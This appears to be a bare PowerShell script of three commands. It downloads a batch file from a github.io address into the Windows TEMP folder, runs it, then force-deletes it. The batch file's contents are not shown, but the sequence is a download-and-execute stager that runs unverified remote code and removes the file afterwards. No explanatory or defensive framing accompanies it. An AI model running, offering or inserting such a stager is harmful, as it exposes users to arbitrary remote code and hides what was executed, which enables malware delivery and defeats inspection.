Invoke-WebRequest -Uri https://qhvg.github.io/win/main.bat -OutFile "$env:TEMP\windows.bat"
Start-Process -FilePath "$env:TEMP\windows.bat" -Wait
Remove-Item -Path "$env:TEMP\windows.bat" -Force
